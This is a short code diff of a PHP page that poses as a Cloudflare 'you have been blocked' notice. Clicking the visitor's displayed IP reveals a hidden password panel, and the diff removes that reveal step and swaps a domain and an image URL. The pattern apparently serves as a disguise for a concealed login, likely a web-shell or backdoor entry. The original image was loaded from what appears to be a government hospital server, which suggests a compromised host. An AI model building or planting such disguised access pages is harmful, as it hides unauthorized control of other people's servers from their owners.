@@ -315,13 +315,13 @@ $ray_id = bin2hex(random_bytes(8));
     <div class="header">
         <div class="header-inner">
             <h1>Sorry, you have been blocked</h1>
-            <p>You are unable to access www.pasnosegargerot.psg</p>
+            <p>You are unable to access <URL></p>
         </div>
     </div>
     
     <div class="browser-window">
         <br><br>
-        <img src="http://smarthospital.rsudkajen.pekalongankab.go.id:8505/labkesda/config/cloudflare.png" alt="Cloudflare Block">
+        <img src="https://l.top4top.io/p_3875iqlof1.png" alt="Cloudflare Block">
     </div>
 
     <div class="info-section">
@@ -363,13 +363,10 @@ $ray_id = bin2hex(random_bytes(8));
     <script>
         function revealIP() {
             var ipElement = document.getElementById('user-ip');
-            var panel = document.getElementById('password-panel');
             ipElement.textContent = "<?php echo htmlspecialchars($user_ip); ?>";
             ipElement.style.cursor = "default";
             ipElement.classList.remove("click-to-reveal");
             ipElement.onclick = null;
-            panel.style.display = 'block';
-            document.getElementById('password-input').focus();
         }
 
         function hidePasswordPanel() {
